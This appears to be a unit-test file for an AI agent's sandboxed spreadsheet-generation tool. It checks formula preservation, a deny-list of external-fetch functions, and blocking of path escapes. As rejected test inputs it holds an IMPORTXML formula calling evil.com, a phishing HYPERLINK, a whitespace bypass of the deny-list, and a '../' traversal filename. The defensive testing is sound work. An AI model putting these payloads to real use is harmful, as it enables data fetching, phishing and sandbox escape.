"""Unit tests for the sheet_generate tool.

Proves:
  - round-trip (write → reopen with openpyxl, assert formulas preserved as
    STRINGS not evaluated values);
  - whitelist enforcement (allowed formulas pass; IMPORTXML/INDIRECT/WEBSERVICE/
    HYPERLINK and unknown functions rejected with a clear error);
  - the write is JAILED: it goes through the sandbox (path-escape attempts are
    rejected) and the artifact lands in the workspace — NOT the host cwd.

The tool declares runs_in="sandbox", so every test drives it through a REAL
process-backend sandbox instance jailed to a temp workspace. That backend's
_resolve() rejects ../ and absolute escapes — the same clamp production uses.
"""

from __future__ import annotations

import tempfile
from pathlib import Path

import openpyxl
import pytest
from conftest import FakeSandboxInstance, call
from perpleximanus.tools.anatomy import ToolContext
from perpleximanus.tools.builtin import build_default_registry
from perpleximanus.tools.builtin.sheets import SheetGenerateArgs, SheetsTool
from perpleximanus.tools.executor import DefaultToolExecutor
from perpleximanus.tools.registry import agent_scope
from perpleximanus.tools.sandbox.base import SandboxSpec
from perpleximanus.tools.sandbox.process import ProcessSandboxInstance
from perpleximanus.tools.secrets import CapabilityBroker


@pytest.fixture
def tmp_workspace():
    """A real temp workspace dir that the jailed sandbox writes into."""
    with tempfile.TemporaryDirectory() as td:
        yield Path(td)


def _jailed_sandbox(workspace: Path) -> ProcessSandboxInstance:
    """The real process backend, jailed to `workspace` — its write_file rejects
    path escapes (../ and absolute), exactly as production does."""
    return ProcessSandboxInstance(
        id="test-sbx",
        owner_id="test",
        conversation_id="test-cid",
        spec=SandboxSpec(),
        workspace=workspace,
    )


def _ctx(sandbox) -> ToolContext:
    return ToolContext(
        sandbox=sandbox,
        workspace_path=".",  # jailed: relative to the sandbox workspace
        timeout_s=30,
        capabilities=CapabilityBroker().grant(frozenset()),
        owner_id="test",
        conversation_id="test-cid",
    )


async def test_round_trip_formulas_preserved_as_strings(tmp_workspace):
    """Write a workbook with formulas, reopen with openpyxl, assert:
    - Formulas are preserved as STRINGS (e.g. '=SUM(A2:A4)'), not evaluated values.
    - Values are stored correctly.
    - Column headers are present.
    """
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Test Workbook",
        filename="formula_test.xlsx",
        sheets=[
            dict(
                name="Sales",
                columns=["Item", "Price", "Qty", "Total"],
                rows=[
                    ["Widget", 10, 5, "=B2*C2"],
                    ["Gadget", 15, 3, "=B3*C3"],
                    ["Doohickey", 7, 8, "=B4*C4"],
                    ["SUBTOTAL", "", "", "=SUM(D2:D4)"],
                ],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert outcome.success, f"Tool failed: {outcome.error}"
    assert outcome.artifacts == ["formula_test.xlsx"]

    # The file landed IN the jailed workspace (not the host cwd).
    wb = openpyxl.load_workbook(tmp_workspace / "formula_test.xlsx")
    ws = wb["Sales"]

    # Column headers.
    assert ws.cell(row=1, column=1).value == "Item"
    assert ws.cell(row=1, column=2).value == "Price"

    # Row 2: Widget, 10, 5, =B2*C2
    assert ws.cell(row=2, column=1).value == "Widget"
    assert ws.cell(row=2, column=2).value == 10
    assert ws.cell(row=2, column=3).value == 5
    # KEY ASSERTION: formula preserved as '=B2*C2', NOT the evaluated value 50.
    assert ws.cell(row=2, column=4).value == "=B2*C2", (
        f"Expected formula string '=B2*C2', got {ws.cell(row=2, column=4).value!r}"
    )

    # Row 5: SUM total — formula preserved as '=SUM(D2:D4)', NOT 50+45+56=151.
    assert ws.cell(row=5, column=4).value == "=SUM(D2:D4)", (
        f"Expected formula string '=SUM(D2:D4)', got {ws.cell(row=5, column=4).value!r}"
    )

    wb.close()


async def test_formula_whitelist_rejected_importxml(tmp_workspace):
    """IMPORTXML is explicitly rejected with a clear error message."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Bad Workbook",
        filename="bad.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=IMPORTXML(\"http://evil.com\", \"//data\")"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success
    assert "IMPORTXML" in outcome.content
    assert "REJECTED" in outcome.content
    assert "external-fetch" in outcome.content.lower() or "indirection" in outcome.content.lower()
    # A rejected formula must NOT have written anything.
    assert not (tmp_workspace / "bad.xlsx").exists()


async def test_formula_whitelist_rejected_indirect(tmp_workspace):
    """INDIRECT is explicitly rejected."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="INDIRECT Attempt",
        filename="indirect.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=INDIRECT(\"B\" & ROW())"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success
    assert "INDIRECT" in outcome.content
    assert "REJECTED" in outcome.content


async def test_whitespace_function_call_still_validated(tmp_workspace):
    """A function call with whitespace before '(' — `INDIRECT ("A1")` — must STILL
    be caught. Some spreadsheet engines tolerate that spacing; if the matcher
    anchored '(' immediately after the name, the call would slip past the
    deny-list entirely. This is the regression guard for that bypass."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Spaced INDIRECT",
        filename="spaced.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=INDIRECT (\"A1\")"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success, "spaced INDIRECT( must be rejected, not slip past the whitelist"
    assert "INDIRECT" in outcome.content
    assert not (tmp_workspace / "spaced.xlsx").exists()


async def test_formula_whitelist_rejected_webservice(tmp_workspace):
    """WEBSERVICE is explicitly rejected."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="WEBSERVICE Attempt",
        filename="webservice.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=WEBSERVICE(\"http://example.com/api\")"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success
    assert "WEBSERVICE" in outcome.content


async def test_formula_whitelist_rejected_hyperlink(tmp_workspace):
    """HYPERLINK is explicitly rejected."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="HYPERLINK Attempt",
        filename="hyperlink.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=HYPERLINK(\"http://phishing.example.com\", \"Click here\")"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success
    assert "HYPERLINK" in outcome.content


async def test_allowed_formulas_pass(tmp_workspace):
    """A sheet with diverse allowed formulas (SUM, AVERAGE, IF, VLOOKUP, INDEX,
    MATCH, DATE) passes validation and writes successfully."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Allowed Formulas",
        filename="allowed.xlsx",
        sheets=[
            dict(
                name="Data",
                columns=["Category", "Value", "Comment"],
                rows=[
                    ["A", 100, "=SUM(B2:B5)"],
                    ["B", 200, "=AVERAGE(B2:B5)"],
                    ["C", 150, "=IF(B3>100, \"HIGH\", \"LOW\")"],
                    ["D", 50, "=VLOOKUP(\"A\", A2:B5, 2, FALSE)"],
                    ["E", "", "=INDEX(B2:B5, MATCH(\"C\", A2:A5, 0))"],
                    ["Date", "", "=DATE(2026, 6, 11)"],
                ],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert outcome.success, f"Tool failed: {outcome.content}"
    assert outcome.artifacts == ["allowed.xlsx"]

    wb = openpyxl.load_workbook(tmp_workspace / "allowed.xlsx")
    ws = wb["Data"]

    assert ws.cell(row=2, column=3).value == "=SUM(B2:B5)"
    assert ws.cell(row=3, column=3).value == "=AVERAGE(B2:B5)"
    assert ws.cell(row=4, column=3).value == "=IF(B3>100, \"HIGH\", \"LOW\")"
    assert ws.cell(row=7, column=3).value == "=DATE(2026, 6, 11)"

    wb.close()


async def test_unknown_formula_rejected(tmp_workspace):
    """A formula using a function NOT in the whitelist (and not in the reject
    list) should be rejected with a message saying it's not allowed."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Unknown Fn",
        filename="unknown.xlsx",
        sheets=[
            dict(
                name="Sheet1",
                columns=["A"],
                rows=[["=FOOBARBAZ(A1:A10)"]],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert not outcome.success
    assert "FOOBARBAZ" in outcome.content
    assert "not in the allowed whitelist" in outcome.content.lower()


async def test_path_traversal_filename_rejected(tmp_workspace):
    """A model-controlled filename that escapes the workspace (../) must be
    rejected by the sandbox jail and surfaced as a clean failure — and NOTHING
    is written outside the workspace. This is the regression guard for the
    host-cwd write bug (the tool used to wb.save() directly to ctx.workspace_path
    '.' on the host, bypassing the jail)."""
    reg = build_default_registry()
    ex = DefaultToolExecutor(reg, agent_scope(), sandbox=_jailed_sandbox(tmp_workspace))

    escape_target = tmp_workspace.parent / "escape.xlsx"
    assert not escape_target.exists()

    res = await ex.execute(
        call(
            "sheet_generate",
            title="Escape",
            filename="../escape.xlsx",
            sheets=[dict(name="S", columns=["A"], rows=[["x"]])],
        )
    )

    assert res.success is False, "path escape must fail, not write outside the jail"
    assert not escape_target.exists(), "no file may be written outside the workspace"


async def test_multiple_sheets(tmp_workspace):
    """Workbook with multiple sheets is written correctly."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Multi-Sheet",
        filename="multi.xlsx",
        sheets=[
            dict(
                name="Revenue",
                columns=["Month", "Amount"],
                rows=[["Jan", 1000], ["Feb", 1200], ["Total", "=SUM(B2:B3)"]],
            ),
            dict(
                name="Costs",
                columns=["Month", "Amount"],
                rows=[["Jan", 600], ["Feb", 700], ["Total", "=SUM(B2:B3)"]],
            ),
        ],
    )

    outcome = await tool.run(args, ctx)
    assert outcome.success, f"Tool failed: {outcome.content}"

    wb = openpyxl.load_workbook(tmp_workspace / "multi.xlsx")
    assert set(wb.sheetnames) == {"Revenue", "Costs"}
    assert wb["Revenue"].cell(row=4, column=2).value == "=SUM(B2:B3)"
    assert wb["Costs"].cell(row=4, column=2).value == "=SUM(B2:B3)"
    wb.close()


async def test_tool_registered_and_scoped():
    """sheet_generate is in the default registry AND in agent scope."""
    reg = build_default_registry()
    agt_scope = agent_scope()
    assert "sheet_generate" in reg.names()
    assert "sheet_generate" in agt_scope.allowed_tools

    tool = reg.get("sheet_generate", scope=agt_scope)
    assert tool is not None
    assert tool.definition.name == "sheet_generate"


async def test_executor_rejects_sheet_generate_in_research_scope():
    """sheet_generate is agent-scope only, not research."""
    from perpleximanus.tools.registry import research_scope

    reg = build_default_registry()
    ex = DefaultToolExecutor(reg, research_scope(), sandbox=FakeSandboxInstance())
    res = await ex.execute(
        call("sheet_generate", title="Test", filename="x.xlsx", sheets=[])
    )
    assert res.success is False
    assert res.structured["kind"] == "unknown_tool"


async def test_simple_value_sheet(tmp_workspace):
    """A sheet with plain values only (no formulas) writes correctly."""
    tool = SheetsTool()
    ctx = _ctx(_jailed_sandbox(tmp_workspace))

    args = SheetGenerateArgs(
        title="Plain Values",
        filename="plain.xlsx",
        sheets=[
            dict(
                name="Data",
                columns=["Name", "Age", "City"],
                rows=[
                    ["Alice", 30, "NYC"],
                    ["Bob", 25, "LA"],
                    ["Carol", 35, "Chicago"],
                ],
            )
        ],
    )

    outcome = await tool.run(args, ctx)
    assert outcome.success

    wb = openpyxl.load_workbook(tmp_workspace / "plain.xlsx")
    ws = wb["Data"]
    assert ws.cell(row=2, column=1).value == "Alice"
    assert ws.cell(row=2, column=2).value == 30
    assert ws.cell(row=3, column=3).value == "LA"
    wb.close()
